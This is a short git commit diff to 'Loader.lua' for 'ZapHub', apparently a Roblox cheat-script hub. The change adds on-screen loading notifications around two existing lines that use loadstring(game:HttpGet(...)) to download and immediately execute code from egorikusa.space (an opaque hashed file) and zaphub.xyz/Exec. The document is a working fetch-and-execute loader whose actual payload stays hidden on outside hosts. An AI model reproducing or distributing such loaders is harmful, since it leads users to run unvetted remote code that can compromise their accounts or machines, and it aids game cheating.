178c5ceac48ac567521e05631b8cea89af4f23d8
zaplua <kaani.bye2@gmail.com>
2024-05-14 13:00:37 +0200

    Update Loader.lua

--- Loader.lua
+++ Loader.lua
@@ -1,3 +1,16 @@
-print('Loading ZapHub...')
+game:GetService("StarterGui"):SetCore("SendNotification",{
+	Title = "ZapHub",
+	Text = "Loading Utils..."
+})
 loadstring(game:HttpGet('https://egorikusa.space/78eede770504999a0cbdf477.lua'))()
+
+game:GetService("StarterGui"):SetCore("SendNotification",{
+	Title = "ZapHub",
+	Text = "Loading ZapHub..."
+})
 loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
+
+game:GetService("StarterGui"):SetCore("SendNotification",{
+	Title = "ZapHub",
+	Text = "Finished loading."
+})
